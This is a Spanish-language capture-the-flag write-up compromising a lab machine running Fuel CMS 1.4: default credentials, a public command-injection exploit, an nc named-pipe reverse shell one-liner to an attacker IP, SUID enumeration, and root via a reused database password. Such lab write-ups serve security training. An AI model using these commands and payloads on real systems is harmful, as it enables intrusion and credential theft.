

# Reconocimiento

![[Pasted image 20240405154504.png]]

El unico servicio expuesto es un servidor http, en el puerto 80, y encontramos rutas como /fuel/ y robots.txt, procedemos a ver la pagina web y nos encontramos con un cms con nombre Fuel

![[Pasted image 20240405154944.png]]

Comprobamos la ruta /fuel/ dentro de la raiz y nos encontramos con un panel de autenticación, correspondiente al cms

![[Pasted image 20240405155709.png]]

Haciendo una brusquedad en internet sobre las credenciales por defecto probamos admin:admin, y logramos entrar al desaborad del admin

![[Pasted image 20240405160004.png]]

![[Pasted image 20240405160106.png]]

Podemos comprobar la versión del cms en /fuel/site_docs y confirmar que es la versión 1.4, por lo cual buscare un script para esta versión dado que tenemos credenciales 

Copiaremos el archivo y editaremos las variables que correspondientes para lanzar el exploit

![[Pasted image 20240405163525.png]]

Copiaremos el exploit utilizando searchsploit -m 50477.py, podemos apreciar que 
Editando el script, comprobamos url al que le hace la petición el script e intentamos decodificarlo para poder leerlo

![[Pasted image 20240405164445.png]]
![[Pasted image 20240405164458.png]]

Podemos observar que la consulta se hace a la web /fuel/pages/select?filter= y el filtro ejecuta los siguientes comandos pi(print($a= 'system'))+ $a(' quote(cmd)')+ ', lo que nos dice es que este exploit ejecuta comando mediante php.

Ejecutamos el script y podremos ejecutar a nivel de sistema con el usuario www-data y podemos obtener la primera bandera

![[Pasted image 20240405165241.png]]


# Acceso inicial

Podremos en escucha el netcat y veremos si es posible generarnos una bash inversa

![[Pasted image 20240405165658.png]]

He intentado varias shells, hasta que he dado con la correcta `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.74.176 1337 >/tmp/f`

![[Pasted image 20240405170138.png]]

![[Pasted image 20240405170412.png]]

Hemos conseguido acceso a la maquina, desde el usuario www-data, veremos www-data es el unico a nivel de sistema y que permisos tiene, pero antes un tratamiento a la tty `python -c 'import pty; pty.spawn("/bin/bash")'`

Y conseguimos la bandera

![[Pasted image 20240405170741.png]]



# Escalada de privilegios

Buscaremos los archivos de root que puede ejecutar el usuario www-data usando el comando `find / -perm -4000 2>/dev/null` , podríamos buscar en GTFObins algún binario fuera de lo común, también veremos las conexiones TCP y UDP que tiene a la escucha

![[Pasted image 20240405171013.png]]

![[Pasted image 20240405171111.png]]

Ninguno de los binarios parece poder escalar privilegio, sin autenticación, buscaremos en internet donde se encuentra almacenada la base de datos, y leeremos el archivo en busquedad de credenciales

![[Pasted image 20240405172315.png]]

Listando archivos, encontramos dentro de la carpeta aplicación un archivo llamado database.php, intentaremos leerlo para ver las credenciales

![[Pasted image 20240405172418.png]]

Entramos a la base de datos, para verificar si hay algo dentro. 

![[Pasted image 20240405172538.png]]

![[Pasted image 20240405172841.png]]

Pero únicamente vemos el administrador, del CMS, intentemos usar la contraseña, para el usuario www-data o el usuario root

![[Pasted image 20240405173123.png]]

Y efectivamente logramos comprometer la maquina por completo con el usuario root, por una mala reutilización de credenciales, con esto podremos ver la bandera de root

![[Pasted image 20240405173222.png]]

